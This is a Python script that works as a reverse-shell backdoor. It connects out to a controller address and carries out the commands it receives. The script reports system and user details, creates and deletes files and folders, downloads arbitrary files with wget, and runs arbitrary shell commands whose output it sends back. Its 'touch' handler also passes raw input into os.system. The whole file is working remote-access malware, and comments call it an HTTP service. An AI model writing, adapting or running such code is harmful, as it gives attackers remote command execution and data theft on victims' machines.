connect: str="127.0.0.1"
port: int=8888


import os
import socket
import platform
import wget


run_path: str = os.getcwd()

def socket_service():
    #print(" [INFO] START HTTP SEVICE ON PORT: "+str(port))
    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_socket.connect((connect,port))

    #http_socket.send(bytes("GET /?api_key HTTP/1.1".encode()))
    http_socket.send("ok".encode())
    while True:
        try:
            ret = http_socket.recv(1024)
            client_message = ret.decode("utf-8")
            client_message = client_message.replace("\n","")
            client_message = client_message.strip()
            #print(client_message+";")

            if client_message == 'exit':
                http_socket.close()
                exit(0)
                break

            if client_message == 'getinfo':
                os_name = " OS Name: "+os.name
                os_login = " Login User: " + os.getlogin()
                host_name = " Host Name: "+socket.gethostname()
                machine = " Platform Machine: "+platform.machine()
                processor = " Processor: "+platform.processor()
                ip = " IP: "+socket.gethostbyname(socket.gethostname())

                information = '\n'+os_name + '\n' + os_login + "\n" + host_name +"\n"+machine+"\n"+processor+"\n"+ip+"\n"

                http_socket.send(information.encode())
                continue

            if client_message.startswith("mkdir "):
                create_path = client_message[6:len(client_message)]
                os.mkdir(create_path)
                http_socket.send("create ok!".encode())
                continue

            if client_message.startswith("touch "):
                create_path = client_message[6:len(client_message)]
                os.system("echo '' > "+create_path)
                http_socket.send("create ok!".encode())

            if client_message == 'none':
                http_socket.send(" ".encode())
                continue

            if client_message.startswith("rmdir "):
                rm_path = client_message[6:len(client_message)]
                os.removedirs(rm_path)
                http_socket.send("Delete succesful!".encode())
                continue

            if client_message.startswith("rmfile "):
                rm_path = client_message[7:len(client_message)]
                os.remove(rm_path)
                http_socket.send("Delete succesful!".encode())
                continue

            if client_message.startswith("wget "):
                wget_url = client_message[5:len(client_message)]
                name = wget.download(wget_url,out=wget.filename_from_url(wget_url))
                http_socket.send(("Download File:"+wget.filename_from_url(wget_url)+" Successful!").encode())
                continue

            if client_message.startswith("shell:"):
                shell: str = client_message[client_message.index("shell:")+6:len(client_message)]
                shell: str = shell.strip()
                print(shell)
                if shell.startswith("cd "):
                    cd_path = shell[3:len(shell)]
                    cd_path = cd_path.strip()
                    print(cd_path)
                    try:
                        if os.path.exists(cd_path) and os.path.isdir(cd_path):
                            http_socket.send("cd: "+cd_path+" successful!")
                        else:
                            http_socket.send("cd: "+cd_path+" error!")
                    except:
                        http_socket.send("cd: "+cd_path+" error!")
                    continue
                else:
                    run = os.popen("cd "+run_path+" && "+shell)
                    #o = open(os.environ['HOME']+"/command_run_log.log")
                    s = run.read()
                    run.close()
                    http_socket.send(bytes(s.encode()))
                    continue

            else:
                http_socket.send(bytes("send command error".encode()))
                continue
                
        except:
            http_socket.send("run command error".encode())
            continue

if __name__ == '__main__':
    socket_service()
    
